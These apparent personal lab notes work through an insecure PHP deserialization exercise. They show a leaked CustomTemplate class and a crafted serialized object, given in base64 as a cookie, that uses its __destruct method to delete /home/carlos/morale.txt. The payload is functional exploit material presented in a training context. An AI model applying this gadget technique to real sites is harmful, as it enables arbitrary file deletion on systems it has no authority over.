<!--
    
Original serialised data
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"jtmm15rytpus06nmx05dvxmwh51mep8d";}

the source reveals a file path /libs/CustomTemplate.php
check its source by visiting https://LAB-ID.web-security-academy.net/libs/CustomTemplate.php~ 
-->


<!-- class CustomTemplate {                          
    private $template_file_path;                //class property template_file_path  
    private $lock_file_path;                  //class property lock_file_path 

    public function __construct($template_file_path) {          //on instatiation of an object 
        $this->template_file_path = $template_file_path;          //set the template_file_path property  
        $this->lock_file_path = $template_file_path . ".lock";      //concatenation  example->TEMP/FILE_NAME.HTML.lock
    }
    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }
    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }
    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }
    function __destruct() {                             //deletes the existing lock file
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
} 


Modified serialised data
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
GET /libs/CustomTemplate.php
    add the encoded, modified, serialised cookie data
    TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==

Deserialization methods do not typically check what they are deserializing
   ◇ pass in objects of any serializable class that is available to the website, and the object will be deserialized
-->